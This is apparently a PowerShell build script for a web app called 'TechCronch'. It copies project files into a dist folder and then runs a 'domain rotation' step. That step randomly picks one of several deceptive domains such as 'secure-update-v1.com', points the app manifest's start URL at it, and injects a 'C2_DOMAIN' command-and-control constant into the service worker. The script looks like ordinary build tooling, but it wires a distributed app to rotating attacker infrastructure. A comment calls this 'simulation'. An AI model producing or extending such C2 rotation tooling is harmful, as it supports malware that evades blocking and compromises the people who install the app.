# Deploy Script for TechCronch
# Builds the project into the 'dist' directory and prepares it for deployment

$Dist = "e:\ucheP\dist"

Write-Host "Starting Build Process..." -ForegroundColor Green

# 1. Clean and Create Dist Directory
if (Test-Path $Dist) { 
    Write-Host "Cleaning existing dist directory..."
    Remove-Item $Dist -Recurse -Force 
}
New-Item -ItemType Directory -Path $Dist | Out-Null

# 2. Copy Core Files
Write-Host "Copying files..."
$FilesToCopy = @("index.html", "manifest.json", "sw.js", "dashboard.html", "github_deploy.ps1")
foreach ($File in $FilesToCopy) {
    if (Test-Path "e:\ucheP\$File") {
        Copy-Item "e:\ucheP\$File" $Dist
    }
}

# 3. Copy Directories
$DirsToCopy = @("_sdk", "assets")
foreach ($Dir in $DirsToCopy) {
    if (Test-Path "e:\ucheP\$Dir") {
        Copy-Item "e:\ucheP\$Dir" $Dist -Recurse
    }
}

# 4. Domain Rotation Logic (Applied to Build Artifacts only)
$Domains = @("secure-update-v1.com", "system-check-v2.net", "assets-cdn-v3.org")
$CurrentDomain = $Domains | Get-Random
Write-Host "Configuring for infrastructure: $CurrentDomain" -ForegroundColor Cyan

# Update manifest.json in dist
$ManifestPath = "$Dist\manifest.json"
if (Test-Path $ManifestPath) {
    try {
        $ManifestContent = Get-Content $ManifestPath -Raw
        if ($ManifestContent) {
            $Manifest = $ManifestContent | ConvertFrom-Json
            $Manifest.start_url = "https://$CurrentDomain/index.html"
            $Manifest | ConvertTo-Json -Depth 10 | Set-Content $ManifestPath -Encoding UTF8
        }
    } catch {
        Write-Warning "Failed to update manifest.json: $_"
    }
}

# Update Service Worker in dist
$SWPath = "$Dist\sw.js"
if (Test-Path $SWPath) {
    $SW = Get-Content $SWPath -Raw -Encoding UTF8
    # Only replace if the pattern exists, otherwise append it for simulation
    if ($SW -match 'const C2_DOMAIN') {
        $SW = $SW -replace "const C2_DOMAIN = ['`"].*['`"]", "const C2_DOMAIN = `"$CurrentDomain`""
    } else {
        # Inject it at the top if missing, as it might be used by other logic
        $SW = "const C2_DOMAIN = `"$CurrentDomain`";`n" + $SW
    }
    $SW | Set-Content $SWPath -Encoding UTF8
}

Write-Host "✅ Build Complete in $Dist" -ForegroundColor Green
Write-Host "You can now deploy the 'dist' folder or run 'npx http-server dist' to preview."
